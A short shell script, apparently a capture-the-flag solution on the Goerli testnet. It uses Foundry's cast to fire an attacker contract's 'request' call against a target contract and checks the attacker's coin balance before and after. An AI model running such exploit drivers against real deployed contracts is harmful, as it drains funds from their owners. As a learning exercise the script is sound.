set -o allexport
source ./.env
source ./.env_public
set +o allexport

echo "Before: coin.balances(address)"
cast call $COIN \
    "balances(address)(uint256)" \
    $ATTACK \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo


echo "Request tokens..."
cast send $ATTACK \
    "request(address)" \
    $GOOD \
    --private-key $PRIVATE_KEY_1 \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
    --confirmations 3
echo 


echo "After: coin.balances(address)"
cast call $COIN \
    "balances(address)(uint256)" \
    $ATTACK \
    --rpc-url https://goerli.infura.io/v3/$PROJECT_ID
echo

